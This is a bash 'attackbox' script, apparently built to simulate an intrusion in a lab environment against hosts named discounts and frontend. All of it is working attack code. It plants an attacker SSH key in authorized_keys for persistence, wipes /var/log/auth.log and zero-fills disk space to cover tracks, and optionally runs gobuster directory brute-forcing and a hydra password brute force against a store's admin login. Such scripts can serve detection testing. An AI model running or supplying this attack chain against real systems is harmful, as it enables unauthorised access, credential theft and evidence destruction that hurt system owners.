#!/bin/bash
echo "Starting attackbox..."

echo "attempt to copy attacker key to discounts...."
scp -o StrictHostKeyChecking=no ./keys/attacker-key.pub test@discounts:/home/test/.ssh

echo "attempt to update authorized_keys to have attacker key..."
ssh -o StrictHostKeyChecking=no test@discounts /bin/bash <<EOT
cat /home/test/.ssh/attacker-key.pub >> /home/test/.ssh/authorized_keys
exit
EOT

echo "attempt to clear log file and zero out unallocated disk space"
ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
echo "test" | sudo -S cp /dev/null /var/log/auth.log
echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
exit
EOT

if  [ "${DIRBUSTER}" = true ];
then
echo "I invoked gobuster!"
./gobuster dir -u http://frontend:3000 -w /usr/share/wordlists/rockyou.txt
fi

if  [ "${BRUTEFORCE}" = true ];
then
echo "I invoked hydra!"
hydra -l admin@storedog.com -P /usr/share/wordlists/rockyou.txt -s 3000 frontend http-post-form "/login:utf8=%E2%9C%93&authenticity_token=BonCnTVpWzCfGtgqZ7TiwEcSH89jz30%2F01vkNuVsKyKcC8xCF2DqeHF%2Bc%2B4U2CNWeArygGNPX%2BDvONHHz7Dr6Q%3D%3D&spree_user%5Bemail%5D=admin%40storedog.com&spree_user%5Bpassword%5D=^PASS^&spree_user%5Bremember_me%5D=0&commit=Login:Invalid email or password."
fi


echo "done!" && sleep 3500